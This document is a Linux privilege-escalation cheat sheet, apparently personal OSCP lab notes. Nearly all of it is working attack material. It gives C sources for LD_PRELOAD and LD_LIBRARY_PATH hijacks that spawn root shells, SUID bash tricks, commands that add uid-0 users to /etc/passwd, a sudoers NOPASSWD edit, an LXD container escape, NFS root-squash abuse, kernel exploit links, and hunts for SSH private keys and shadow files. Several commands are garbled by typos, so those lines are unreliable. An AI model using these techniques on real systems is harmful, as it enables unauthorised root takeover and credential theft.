## Run Linpeas
Check 
- [ ] cat .bash_history
- [ ] env
- [ ] .bashrc
- [ ] whoami
- [ ] id
- [ ] sudo -l (check which user can run and get privesc using GTFOBins)
If there isnt a file that can be run as sudo try to create a file there with same path. eg: derpy.sh (with content chmod +s /bin/bash) and then sudo ./derpy.sh && /bin/bash -p.

TO IDENTIFY HOW A FILE IS GETTING CALLED grep -r "/home/oscp/ip" 
/etc/ 
```
cat/etc/group  
getent group "groupname"  
cat /etc/passwd
ls -la /etc/shadow  
route  
routel  
cat /etc/iptables/rules.v4
```
## Process Enumeration
```
watch -n1 "ps-aux | grep pass" 
sudo tcpdump -i lo -A | grep "pass"
ps -u -C passwd
```

## Break Restricted Bash via SSH
```
ssh test@IP -t "bash --noprofile"
```

## OS Enumeration
```
cat/etc/issue  
cat /etc/*-release
cat/proc/version
uname-a  
arch  
ldd --version
```

## Tools Installed 
```
which awk perl python ruby gcc cc vi vim nmap find netcat nc wget tftp ftp 2>/dev/null
```

## File Owners & Permissions
```
ls -la  
find . -ls (displays all files and its child files in current dir)  
history  
cat ~/.bash_history  
find / -type f -user <username> -readable 2>/dev/null (Readable files for user) 
find / -writable -type d 2>/dev/null (Writable files by the user)  
find / -writable 2>/dev/null | cut -d"/" -f 2 |sort-u (Writable Directories)  
find / -perm -0002 -type d -print 2>/dev/null (World writable directories)  
find / -name "test.py" 2>/dev/null (alternate of locate cmd)  
find /usr/local/ -type d -writable
```
If a file owner is root but the directory owner is regular user, we can change the replace the contents of the file using echo "content" > rootownedfile

## Kernel Exploits (Use GCC or CC)
```
uname -a
cat /proc/version
cat /etc/lsb-release
cat /etc/os-release
gcc exp.c -o exp.shot exp.exe
add -w, -static, -pthread (if pthread error occurs)
searchsploit "name with version"
```

PwnKit - https://github.com/ly4k/PwnKit

DirtyCow - https://raw.githubusercontent.com/firefart/dirtycow/master/dirty.c

Overlayfs - https://www.exploit-db.com/exploits/37292

https://www.exploit-db.com/exploits/45010 - linux kernel < 4.13.9

Linux Kernel 2.6.22 < 3.9 - https://www.exploit-db.com/exploits/40839

Linux Kernel 2.6.39 < 3.2.2 (Gentoo / Ubuntu x86/x64) = 18411.c

Linux Kernel < 4.4.0-116 (Ubuntu16.04.4) - https://www.exploit-db.com/exploits/44298

## Sudo -L
- GTFO BINS
- look for env eg : if LD_Preload is present,
create a env.c file with below contents,
```env.c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
	unsetenv("LD_PRELOAD");
	setresuid(0,0,0,);
	system("/bin/bash -p");
}
```

```
gcc -fPIC -shared -o /tmp/env env.c -nostartfiles
sudo LD_PRELOAD=/tmp/preload.so program-name-here
```
- lookforenveg:LD_LIBRARY_PATH  
- look for shared libraries on the listed programs/binaries on sudo -l ldd binaryname (look for the listed library names)  
create a library_path.c file
```library_path.c
#include <stdio.h>
#include <stdlib.h>

static void hijack()__attribute__((constructor));

void hijack(){
	unsetenv("LD_LIBRARY_PATH");
	setresuid(0,0,0);
	system("/bin/bash -p");
}
```
run this code 
```
gcc -o /tmp/lib.so -shared -fPIC library_path.c
sudo LD_LIBRARY_PATH=/tmp binaryname
```

- IF FILE IS NOT THERE CREATE A FILE AND DON’T FORGET TO GIVE EXECUTION PERMISSIONS

## SUID Enumeration 
```
find / -perm -u=s -type f 2>/dev/null
``` 
gtfo bins, binary versions? look at exploitdb, shared object injection THM task12, strings binary -> look for any path of binaries -> if present
/bin/bash --version ( < 4.2-048)  
function "that absolute path" { /bin/bash -p; }  
export -f "that absolute path"  
call the suid binary ( for doubts THM linprivesc tasks)  
or  
bash --version ( < 4.4)  
env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' "that absolute path" /tmp/rootbash -p  
Note: For eg: if python2.7 has suid bit set spawn a tty shell without sudo we can get root

## CAPABILITIES

```
getcap -r / 2>/dev/null  
```
eg: /home/cyber/tarcap_dac_read_search=ep this cap will help us to read any files cmd: tar cf file.tar "path we want"
    
## SERVICE EXPLOITS:
    
- find a service run by root
    
- grep -r "/home/oscp/ip" /etc/ (finding a service for thw writable exe ip in /etc dir)
    
- if the execu table is in writable dir replace that with chmod +s /bin/bash and restart the service/ reboot the server
    
- even if that file is owned by root if dir is owned by user we can replace the file.
    
## CRON JOBS:
    
```
cat /etc/crontab
    
*****jobgetsexecutedeveryminute
    
check root owns that file executes it
    
look for write permission on that file if yes replace with a basic linux reverse shell payload or chmod +s /bin/bash
    
start a listener on kali
    
grep "CRON" /var/log/syslog
```    
## LXD GROUP:
    
```
git clone https://github.com/saghul/lxd-alpine-builder.git
cd lxd-alpine-builder
rm alpine-v3.13-x86_64-20210218_0139.tar.gz
sudo ./build-alpine
Transfer the .tar.gz file to shell
Find the lxc file if its not there by default
/snap/bin/lxc image import ./alpine-v3.18-x86_64-20230718_0359.tar.gz --alias myimage
    
/snap/bin/lxc init myimage ignite -c security.privileged=true
    
/snap/bin/lxc storage create pool dir
    
/snap/bin/lxc profile device add default root disk path=/pool=pool
    
/snap/bin/lxc storage list
    
/snap/bin/lxc init my image ignite -c security.privileged=true
    
/snap/bin/lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
    
/snap/bin/lxc start ignite
    
/snap/bin/lxc exec ignite /bin/sh
    
cd /mnt/root/root
```
## WRITABLE CRON DIR?
    
https://cheatsheet.haax.fr/linux-systems/privilege-escalation/crontab/#writable-cron-directory
    
## IS THERE A SCRIPTS THAT CHANGES PASSWORD OF USERS AND RUNS AS ROOT
    
Use the having passwords
```
Add "\\x0A\\x0Aroot:NewPass" in order to escape from the -e and to set the root password to NewPass
su root
```
    
## PATH: (Refer THM)
    
```
echo $PATH
echo "chmod +s /bin/bash" >> ps
export PATH=.:$PATH (setting as current path) 
chmod 777 ps
./rootownedfilee
```
## NFS:

```
cat /etc/exports (Look for no_root_squash or no_all_squash)  

showmount -e targetip  

mkdir /tmp/mount  

mount -o rw targetip:/backups/tmp/mount 
or
mount -t nfs ip:/var/backups/tmp/mount (use target ip:/ to mount all shares if multiple were available)  

msfvenom -p linux/x86/exec CMD="/bin/bash-p"-f elf -o /tmp/mount/shell.elf 

chmod +xs shell.elf  

ls -l shell.elf  

./shell.elf
or  
simpleexecutable.c in ~/stuffs/oscp 

gcc nfs.c -static -w -o nfs
or  
put bash suid there
```

## MOOSEFS:

```
mkdir -p /mnt/folder  
```
```
mfsmount /mnt/folder -H ip  
```
Check if there is .ssh folder if so,  
ssh-keygen and move .pub to /mnt/folder/.ssh/authorized_keys  
Look for .sync folder or try to identify username of the server to ssh 
```
ssh -i id_rsa user@ip  
```
or  
Try the above NFS method

## LOOK FOR HIDDEN FILES

```
ls -la /var/backups
```  
- check everything including every weird or typical process and internal
- ports config files has passwords  
- look for root private ssh keys.ssh.  
```
find / -name authorized_keys 2>/dev/null  
find / -name id_rsa 2>/dev/null  
copy/paste contents to kali  
chmod 600 id_rsa  
ssh -i id_rsa root@ip (crack pass using john)
```

## DIRTYCOW

```
exploit in ~/stuffs/oscp/c0w.c 
gccc0w-w-pthread-ocow  
./cow  
/usr/bin/passwd
```

## SHADOW / PASSWD FILE WRITABLE?

```
echo "root2::0:0:root:/root:/bin/bash" >> /etc/passwd 
```
(setting no password for user root2 to we can login as root without passwd since uid and gid is 0.  
or
```
openssl passwd banana or openssl passwd -1 -salt pwn pass123  
```
replace x with hash or create a correct format  
```
echo "root2:$1$ORXgPu49$zUxuMoaybWABa2bhFnIpz0:0:0:root:/root:/bin/bash" >> /etc/passwd ( 0 specifies user is superuser) 
suroot2  
enterpass
```

## SETTING SUID FOR /bin/bash (IF CHMOD CAN BE RUN AS ROOT)

```
/usr/bin/chmod +s /bin/bash
    
try to reboot the machine
    
/bin/bash -p
```    
## ESCALATION METHODS:
    
```
cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash; /tmp/rootbash -p
    
nano /etc/sudoers -> user ALL=(ALL) NOPASSWD:ALL
    
nano /etc/passwd -> change GID to root
    
echo "exploit:YZE7YPhZJyUks:0:0:root:/root:/bin/bash" >> /etc/passwd | su - exploit
    
echo root:gl0b0 | /usr/sbin/ chpasswd
```
    
## SNMP:
    
- Check if snmpd is running as root and /etc/snmp/snmpd.conf is writable
- https://rioru.github.io/pentest/web/2017/03/28/from-unauthenticated-to-root-supervision.html